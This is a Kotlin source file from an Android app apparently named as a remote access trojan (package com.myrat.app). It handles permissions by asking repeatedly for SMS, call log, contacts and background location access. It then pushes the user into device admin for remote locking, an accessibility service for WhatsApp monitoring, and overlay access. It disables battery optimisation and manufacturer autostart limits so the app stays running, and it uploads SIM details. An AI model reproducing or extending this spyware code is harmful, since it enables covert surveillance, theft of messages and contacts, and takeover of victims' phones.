package com.myrat.app.handler

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import com.myrat.app.service.ServiceManager
import com.myrat.app.utils.Logger
import pub.devrel.easypermissions.EasyPermissions
import pub.devrel.easypermissions.PermissionRequest
import java.lang.ref.WeakReference

class PermissionHandler(
    activity: Activity,
    private val simDetailsHandler: SimDetailsHandler,
    private val serviceManager: ServiceManager
) {
    
    private val activityRef = WeakReference(activity)
    private val handler = Handler(Looper.getMainLooper())
    private var currentPermissionGroup = 0
    private var rotationCount = 0
    private val maxRotations = 3 // Ask each permission group 3 times before giving up
    
    companion object {
        private const val RC_SMS_PERMISSIONS = 100
        private const val RC_PHONE_PERMISSIONS = 101
        private const val RC_LOCATION_PERMISSIONS = 102
        private const val RC_STORAGE_PERMISSIONS = 103
        private const val RC_NOTIFICATION_PERMISSIONS = 104
        
        private const val ROTATION_DELAY = 3000L // 3 seconds between rotations
    }
    
    // Permission groups for rotational asking
    private val permissionGroups = listOf(
        PermissionGroup(
            name = "SMS",
            permissions = arrayOf(
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS
            ),
            requestCode = RC_SMS_PERMISSIONS,
            description = "📱 SMS PERMISSIONS (CRITICAL)\n\nRequired for:\n• Receiving SMS messages\n• Reading existing SMS\n• Sending SMS messages\n\nSMS service will start immediately after granting."
        ),
        PermissionGroup(
            name = "PHONE",
            permissions = arrayOf(
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_NUMBERS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG
            ),
            requestCode = RC_PHONE_PERMISSIONS,
            description = "📞 PHONE PERMISSIONS (CRITICAL)\n\nRequired for:\n• Making phone calls with SIM selection\n• Reading phone state and SIM info\n• Accessing contacts\n• Reading call history\n\nCall and contact services will start after granting."
        ),
        PermissionGroup(
            name = "LOCATION",
            permissions = arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ).let { permissions ->
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    permissions + Manifest.permission.ACCESS_BACKGROUND_LOCATION
                } else {
                    permissions
                }
            },
            requestCode = RC_LOCATION_PERMISSIONS,
            description = "📍 LOCATION PERMISSIONS (CRITICAL)\n\nRequired for:\n• Real-time location tracking\n• Location history\n• GPS monitoring\n\nLocation service will start after granting."
        ),
        PermissionGroup(
            name = "STORAGE",
            permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
            } else {
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
            },
            requestCode = RC_STORAGE_PERMISSIONS,
            description = "📁 STORAGE PERMISSIONS\n\nRequired for:\n• Accessing images and files\n• Image upload functionality\n\nImage upload service will start after granting."
        ),
        PermissionGroup(
            name = "NOTIFICATIONS",
            permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                arrayOf(Manifest.permission.POST_NOTIFICATIONS)
            } else {
                emptyArray()
            },
            requestCode = RC_NOTIFICATION_PERMISSIONS,
            description = "🔔 NOTIFICATION PERMISSIONS (Android 13+)\n\nRequired for:\n• Important app notifications\n• Service status updates\n• Alert notifications"
        )
    ).filter { it.permissions.isNotEmpty() } // Remove empty permission groups
    
    data class PermissionGroup(
        val name: String,
        val permissions: Array<String>,
        val requestCode: Int,
        val description: String
    )

    fun requestPermissions() {
        val activity = activityRef.get() ?: return
        
        Logger.log("🔄 Starting ROTATIONAL permission system - will ask each group $maxRotations times")
        currentPermissionGroup = 0
        rotationCount = 0
        
        startRotationalPermissionFlow(activity)
    }

    private fun startRotationalPermissionFlow(activity: Activity) {
        if (currentPermissionGroup >= permissionGroups.size) {
            // Completed one full rotation
            rotationCount++
            currentPermissionGroup = 0
            
            if (rotationCount >= maxRotations) {
                Logger.log("🏁 Completed $maxRotations rotations, moving to special permissions")
                requestSpecialPermissions(activity)
                return
            }
            
            Logger.log("🔄 Starting rotation ${rotationCount + 1}/$maxRotations")
        }
        
        val permissionGroup = permissionGroups[currentPermissionGroup]
        
        // Check if this group is already granted
        if (EasyPermissions.hasPermissions(activity, *permissionGroup.permissions)) {
            Logger.log("✅ ${permissionGroup.name} permissions already granted, skipping")
            serviceManager.checkAndStartAvailableServices()
            currentPermissionGroup++
            
            // Continue immediately to next group
            handler.post { startRotationalPermissionFlow(activity) }
            return
        }
        
        Logger.log("🔄 Rotation ${rotationCount + 1}/$maxRotations - Requesting ${permissionGroup.name} permissions")
        
        try {
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, permissionGroup.requestCode, *permissionGroup.permissions)
                    .setRationale("""
                        ${permissionGroup.description}
                        
                        📊 Progress: Rotation ${rotationCount + 1}/$maxRotations
                        🔄 Group ${currentPermissionGroup + 1}/${permissionGroups.size}: ${permissionGroup.name}
                        
                        Note: We'll ask again if you deny, but services will start with whatever permissions you grant.
                    """.trimIndent())
                    .setPositiveButtonText("Grant ${permissionGroup.name}")
                    .setNegativeButtonText("Skip for now")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting ${permissionGroup.name} permissions", e)
            currentPermissionGroup++
            handler.postDelayed({ startRotationalPermissionFlow(activity) }, ROTATION_DELAY)
        }
    }

    // Callback methods for MainActivity to call
    fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
        val activity = activityRef.get() ?: return
        
        val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
        Logger.log("✅ ${permissionGroup?.name ?: "Unknown"} permissions granted: $perms")
        
        try {
            // Start services immediately when permissions are granted
            serviceManager.checkAndStartAvailableServices()
            
            // Move to next permission group
            currentPermissionGroup++
            
            // Continue with delay to next permission group
            handler.postDelayed({ 
                startRotationalPermissionFlow(activity) 
            }, ROTATION_DELAY)
            
        } catch (e: Exception) {
            Logger.error("Error in onPermissionsGranted", e)
        }
    }

    fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
        val activity = activityRef.get() ?: return
        
        val permissionGroup = permissionGroups.find { it.requestCode == requestCode }
        Logger.warn("❌ ${permissionGroup?.name ?: "Unknown"} permissions denied: $perms")
        
        try {
            // Still check and start available services with granted permissions
            serviceManager.checkAndStartAvailableServices()
            
            // Check if some permissions are permanently denied
            if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
                Logger.warn("⚠️ Some ${permissionGroup?.name} permissions permanently denied")
            }
            
            // Move to next permission group
            currentPermissionGroup++
            
            // Continue with delay to next permission group
            handler.postDelayed({ 
                startRotationalPermissionFlow(activity) 
            }, ROTATION_DELAY)
            
        } catch (e: Exception) {
            Logger.error("Error in onPermissionsDenied", e)
        }
    }

    private fun requestSpecialPermissions(activity: Activity) {
        Logger.log("🔧 Starting special permissions flow")
        
        // Battery optimization (critical for service persistence)
        if (!isBatteryOptimizationDisabled(activity)) {
            requestBatteryOptimization(activity)
            return
        }
        
        // Device admin (for lock service)
        if (!isDeviceAdminEnabled(activity)) {
            requestDeviceAdmin(activity)
            return
        }
        
        // Accessibility service (for WhatsApp monitoring)
        if (!isAccessibilityServiceEnabled(activity)) {
            requestAccessibilityService(activity)
            return
        }
        
        // System overlay
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
            requestOverlayPermission(activity)
            return
        }
        
        // Exact alarms (Android 12+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            if (!alarmManager.canScheduleExactAlarms()) {
                requestExactAlarms(activity)
                return
            }
        }
        
        // All special permissions done, move to manufacturer settings
        requestManufacturerSpecificSettings(activity)
    }

    private fun requestBatteryOptimization(activity: Activity) {
        Logger.log("🔋 Requesting battery optimization disable (CRITICAL for service persistence)")
        
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Battery optimization intent launched")
            
            handler.postDelayed({
                serviceManager.checkAndStartAvailableServices()
                if (!isDeviceAdminEnabled(activity)) {
                    requestDeviceAdmin(activity)
                } else {
                    requestSpecialPermissions(activity) // Continue checking
                }
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request battery optimization", e)
            requestSpecialPermissions(activity) // Continue anyway
        }
    }

    private fun requestDeviceAdmin(activity: Activity) {
        Logger.log("🔐 Requesting device admin (for lock service)")
        
        try {
            val adminComponent = ComponentName(activity, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Device Administrator permission enables remote device locking and security management.")
            }
            activity.startActivity(intent)
            Logger.log("Device admin intent launched")
            
            handler.postDelayed({
                serviceManager.checkAndStartAvailableServices()
                requestSpecialPermissions(activity) // Continue checking
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request device admin", e)
            requestSpecialPermissions(activity) // Continue anyway
        }
    }

    private fun requestAccessibilityService(activity: Activity) {
        Logger.log("♿ Requesting accessibility service (for WhatsApp monitoring and SIM selection bypass)")
        
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            activity.startActivity(intent)
            Logger.log("Accessibility settings intent launched")
            
            handler.postDelayed({
                serviceManager.checkAndStartAvailableServices()
                requestSpecialPermissions(activity) // Continue checking
            }, 5000)
            
        } catch (e: Exception) {
            Logger.error("Failed to open accessibility settings", e)
            requestSpecialPermissions(activity) // Continue anyway
        }
    }

    private fun requestOverlayPermission(activity: Activity) {
        Logger.log("🖼️ Requesting overlay permission")
        
        try {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Overlay permission intent launched")
            
            handler.postDelayed({
                serviceManager.checkAndStartAvailableServices()
                requestSpecialPermissions(activity) // Continue checking
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request overlay permission", e)
            requestSpecialPermissions(activity) // Continue anyway
        }
    }

    private fun requestExactAlarms(activity: Activity) {
        Logger.log("⏰ Requesting exact alarms permission (Android 12+)")
        
        try {
            val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Exact alarms permission intent launched")
            
            handler.postDelayed({
                serviceManager.checkAndStartAvailableServices()
                requestSpecialPermissions(activity) // Continue checking
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request exact alarms permission", e)
            requestSpecialPermissions(activity) // Continue anyway
        }
    }

    private fun requestManufacturerSpecificSettings(activity: Activity) {
        Logger.log("🏭 Opening manufacturer-specific settings")
        
        try {
            val manufacturer = Build.MANUFACTURER.lowercase()
            Logger.log("Device manufacturer: $manufacturer")
            
            when {
                manufacturer.contains("xiaomi") -> openXiaomiSettings(activity)
                manufacturer.contains("oppo") -> openOppoSettings(activity)
                manufacturer.contains("vivo") -> openVivoSettings(activity)
                manufacturer.contains("huawei") -> openHuaweiSettings(activity)
                manufacturer.contains("samsung") -> openSamsungSettings(activity)
                manufacturer.contains("oneplus") -> openOnePlusSettings(activity)
                manufacturer.contains("realme") -> openRealmeSettings(activity)
                else -> {
                    Logger.log("No specific manufacturer settings for: $manufacturer")
                    finishPermissionFlow(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Failed to open manufacturer settings", e)
            finishPermissionFlow(activity)
        }
    }

    private fun openXiaomiSettings(activity: Activity) {
        Logger.log("🔧 Opening MIUI-specific settings")
        
        val intents = listOf(
            // Autostart management
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            // Power keeper
            Intent().setComponent(ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")),
            // Permission editor
            Intent("miui.intent.action.APP_PERM_EDITOR").setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity").putExtra("extra_pkgname", activity.packageName),
            // Security center main
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.securitycenter.Main"))
        )
        
        tryLaunchIntents(activity, intents, "MIUI Settings")
    }

    private fun openOppoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity"))
        )
        tryLaunchIntents(activity, intents, "ColorOS Settings")
    }

    private fun openVivoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"))
        )
        tryLaunchIntents(activity, intents, "Vivo Settings")
    }

    private fun openHuaweiSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"))
        )
        tryLaunchIntents(activity, intents, "Huawei Settings")
    }

    private fun openSamsungSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        tryLaunchIntents(activity, intents, "Samsung Settings")
    }

    private fun openOnePlusSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        tryLaunchIntents(activity, intents, "OnePlus Settings")
    }

    private fun openRealmeSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        tryLaunchIntents(activity, intents, "Realme Settings")
    }

    private fun tryLaunchIntents(activity: Activity, intents: List<Intent>, settingsName: String) {
        for (intent in intents) {
            try {
                if (intent.resolveActivity(activity.packageManager) != null) {
                    activity.startActivity(intent)
                    Logger.log("Successfully opened $settingsName")
                    
                    handler.postDelayed({
                        finishPermissionFlow(activity)
                    }, 2000)
                    return
                }
            } catch (e: Exception) {
                Logger.warn("Failed to launch intent for $settingsName: ${e.message}")
            }
        }
        
        // Fallback to app settings
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Opened app settings as fallback for $settingsName")
        } catch (e: Exception) {
            Logger.error("Failed to open app settings fallback", e)
        }
        
        finishPermissionFlow(activity)
    }

    private fun finishPermissionFlow(activity: Activity) {
        Logger.log("🎉 Rotational permission flow completed!")
        
        try {
            // Final service check and start
            serviceManager.checkAndStartAvailableServices()
            
            // Upload SIM details
            simDetailsHandler.uploadSimDetails()
            
            // Log final service status
            val stats = serviceManager.getServiceStats()
            Logger.log("Final service status: ${stats["running_services"]}/${stats["total_services"]} services running")
            
        } catch (e: Exception) {
            Logger.error("Error in finishPermissionFlow", e)
        }
    }

    // Helper methods
    private fun isBatteryOptimizationDisabled(context: Context): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                powerManager.isIgnoringBatteryOptimizations(context.packageName)
            } else {
                true
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun isDeviceAdminEnabled(context: Context): Boolean {
        return try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(context, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            devicePolicyManager.isAdminActive(adminComponent)
        } catch (e: Exception) {
            false
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        return try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val services = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                services?.contains("${context.packageName}/com.myrat.app.service.WhatsAppService") == true
            } else {
                false
            }
        } catch (e: Exception) {
            false
        }
    }

    fun hasBasicPermissions(): Boolean {
        val activity = activityRef.get() ?: return false
        return permissionGroups.any { group ->
            EasyPermissions.hasPermissions(activity, *group.permissions)
        }
    }

    fun areAllPermissionsGranted(): Boolean {
        val activity = activityRef.get() ?: return false
        
        val allPermissions = permissionGroups.flatMap { it.permissions.toList() }.toTypedArray()
        val runtimeGranted = EasyPermissions.hasPermissions(activity, *allPermissions)
        val batteryOptimized = isBatteryOptimizationDisabled(activity)
        
        return runtimeGranted && batteryOptimized
    }

    fun handleResume() {
        try {
            val activity = activityRef.get() ?: return
            
            // Always check and start available services on resume
            serviceManager.checkAndStartAvailableServices()
            
            if (areAllPermissionsGranted()) {
                Logger.log("All permissions granted on resume")
                finishPermissionFlow(activity)
            }
        } catch (e: Exception) {
            Logger.error("Error in handleResume", e)
        }
    }

    fun cleanup() {
        try {
            handler.removeCallbacksAndMessages(null)
            Logger.log("PermissionHandler cleanup completed")
        } catch (e: Exception) {
            Logger.error("Error in cleanup", e)
        }
    }
}